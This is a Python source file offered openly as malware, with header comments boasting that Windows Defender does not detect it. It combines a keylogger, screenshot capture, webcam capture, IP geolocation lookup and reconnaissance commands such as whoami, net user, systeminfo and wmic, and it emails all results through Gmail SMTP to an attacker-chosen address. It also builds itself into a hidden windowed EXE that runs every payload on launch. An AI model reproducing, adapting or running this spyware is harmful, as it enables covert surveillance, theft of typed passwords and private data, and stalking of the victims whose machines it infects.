import time
import os
import datetime
import smtplib
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import requests
import threading
from PIL import ImageGrab
import shutil
import random
import subprocess
import io
import cv2
from pynput import keyboard
import sys

# The use of this code is your own responsibility and I have no liability.
# windows defender cant be detecting this Malware Maybe custom anti viruses .
# Tested on 2025/5/13
# This script is not included in the Registry startup for security reasons and can only be executed once.
# t.me/Python_Hacking_Tools


now = datetime.datetime.now()
print("Now:")
print(f"Started From : {now}")


def credentials():
    sender = "REPLACE_ME"
    password = "REPLACE_ME"
    receiver = "REPLACE_ME"

    if "REPLACE_ME" in [sender, password, receiver]:
        print("First run - please enter your credentials:")
        sender = input("Your email: ")
        password = input("Your app password egg :(fsaq feqd trtt tgafs) : ")
        receiver = input("Receiver email: ")

        with open(__file__, "r") as f:
            code = f.read()

        code = code.replace('sender = "REPLACE_ME"', f'sender = "{sender}"')
        code = code.replace('password = "REPLACE_ME"', f'password = "{password}"')
        code = code.replace('receiver = "REPLACE_ME"', f'receiver = "{receiver}"')

        with open(__file__, "w") as f:
            f.write(code)

    return sender, password, receiver



def _get_network_information():
    sender, password, receiver = credentials()

    commands = ["tasklist",
                "dir",
                "whoami",
                "ipconfig/all",
                "netstat /a",
                "systeminfo",
                "net user",
                "net config workstation",
                "wmic path win32_VideoController get name",
                "wmic diskdrive get model,size,mediatype",
                "wmic memorychip get capacity,partnumber,speed",
                "wmic computersystem get model,name,manufacturer,systemtype"]
    result = ""

    for i in commands:
        try:
            response = subprocess.run(i, text=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result += f"\n\n===== {i} =====\n"
            if response.stdout:
                result += response.stdout
            if response.stderr:
                result += f"Error: {response.stderr}"
        except Exception as e:
            result += f"\n\nError running command {i}: {str(e)}"
    try:
        server = smtplib.SMTP("smtp.gmail.com", port=587)
        server.starttls()
        server.login(sender, password)

        mime = MIMEMultipart()
        mime["from"] = sender
        mime["to"] = receiver
        mime["subject"] = "Network and Hardware information ."

        mime.attach(MIMEText(result, "plain"))

        server.send_message(mime)
        print("Successfully Send information .")
        server.quit()
    except ConnectionError as not_connected:
        print(f"Failed To Send Email {not_connected}")
        return None



def screen_shot():
    sender, password, receiver = credentials()
    for i in range(random.randint(1,10)):
        try:
            with io.BytesIO() as buffer:
                ImageGrab.grab().save(buffer, format="PNG")
                img_data = buffer.getvalue()
        except Exception as e:
            print(f"Failed to Send Screen shot {e}")

        try:
            server = smtplib.SMTP("smtp.gmail.com", port=587)
            server.starttls()
            server.login(sender, password)

            mime = MIMEMultipart()
            mime["from"] = sender
            mime["to"] = receiver
            mime["subject"] = "Screen shot from target PC ."

            img_part = MIMEImage(img_data, name="screenshot.png")
            mime.attach(img_part)

            server.sendmail(sender, receiver, mime.as_string())
            print("Successfully sent screenshot!")

            time.sleep(random.randint(1,14))

            server.quit()

        except ConnectionError as not_connected:
            print(f"Failed to send Email due to internet connection :{not_connected}")
            return None



def get_user_location():
    sender,password,receiver = credentials()
    location_data = ""
    try:
        url = "http://ip-api.com/json/"
        response = requests.get(url)
        if response.status_code == 200:
            print(f"Successfully get the location information .")
            location_data = response.text
        else:
            print("Failed to Get information .")
    except ConnectionError as not_connected:
        print(f"Failed to connect to internet {not_connected}")
    try:
        server = smtplib.SMTP("smtp.gmail.com",port=587)
        server.starttls()
        server.login(sender,password)

        mime = MIMEMultipart()
        mime["from"] = sender
        mime["to"] = receiver
        mime["subject"] = "User Location ."

        mime.attach(MIMEText(location_data, "plain"))
        server.send_message(mime)
        print("Successfully Send the Location .")
        server.quit()
    except Exception as e:
        print(f"Failed to Send Email {e}")
        return None



def capture_camera():
    sender,password,receiver = credentials()
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Cannot access the camera.")
        return None

    ret, frame = cap.read()
    cap.release()

    if ret:
        print("Successfully captured a frame.")
        return frame
    else:
        print("Failed to capture frame.")
    try:
        server = smtplib.SMTP("smtp.gmail.com",port=587)
        server.starttls()
        server.login(sender,password)

        mime = MIMEMultipart()
        mime["from"] = sender
        mime["to"] = receiver
        mime["subject"] = "captured camera image ."

        mime.attach(MIMEImage(frame,"plain"))
        server.send_message(mime)
        print("successfully Send captured camera .")
        server.quit()
    except ConnectionError as not_connected:
        print(f"Failed to connect to the network {not_connected}")
        return None


def keylogger():
    while True:
        path = "C:\\temp"
        if not os.path.exists(path):
            os.makedirs(path)

        log_file = os.path.join(path, "keylogs.txt")

        def on_press(key):
            try:
                with open(log_file, "a", encoding="utf-8") as f:
                    if key == keyboard.Key.space:
                        f.write(" ")
                    elif key == keyboard.Key.enter:
                        f.write("\n")
                    elif key == keyboard.Key.backspace:
                        f.write("[BACKSPACE]")
                    elif key == keyboard.Key.tab:
                        f.write("[TAB]")
                    elif hasattr(key, 'char'):
                        f.write(key.char)
                    else:
                        f.write(f"[{key.name.upper()}]")
            except Exception as e:
                print(f"Keylogger error: {e}")

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join(timeout=60)

        try:
            sender, password, receiver = credentials()
            with open(log_file, "r") as f:
                logs = f.read()

            server = smtplib.SMTP("smtp.gmail.com", port=587)
            server.starttls()
            server.login(sender, password)

            mime = MIMEMultipart()
            mime["from"] = sender
            mime["to"] = receiver
            mime["subject"] = "Keylogger Results"

            mime.attach(MIMEText(logs, "plain"))
            server.send_message(mime)
            server.quit()

            shutil.rmtree(path)
            print(f"Keylogs sent and temp files cleaned")

        except Exception as e:
            print(f"Failed to send keylogs: {e}")

        time.sleep(60)




def Make_it_to_exe():
    i = input("Do you Continue Make EXE version ? (y,n):")
    if i == "y":
        try:
            subprocess.run(["pip", "install", "pyinstaller"], check=True)
            subprocess.run([
                "pyinstaller",
                "--onefile",
                "--windowed",
                "--hidden-import=psutil",
                "--hidden-import=pynput.keyboard._win32",
                "--hidden-import=pynput.mouse._win32",
                "main.py"
            ], check=True)
            print("Successfully Created EXE on dist folder .")
        except Exception as e:
            print(f"Failed to Create EXE {e}")
    else:
        print("Canceling...")
        sys.exit()


def run_everything():
    threads = [
        threading.Thread(target=_get_network_information, daemon=True),
        threading.Thread(target=screen_shot, daemon=True),
        threading.Thread(target=capture_camera, daemon=True),
        threading.Thread(target=keylogger, daemon=True),
        threading.Thread(target=get_user_location, daemon=True)
    ]

    for t in threads:
        t.start()

    while True:
        if not any(t.is_alive() for t in threads):
            break
        time.sleep(1)

    return (True, True, True, True, True)


def main():
    sender, password, receiver = credentials()

    if len(sys.argv) > 1 and sys.argv[1] == "--auto":
        run_everything()
    else:
        print("1. Create EXE version")
        print("2. Exit")
        choice = input("Select option: ")

        if choice == "1":
            Make_it_to_exe()
        else:
            print("Exiting...")


if __name__ == "__main__":
    if getattr(sys, 'frozen', False):
        run_everything()
    else:
        main()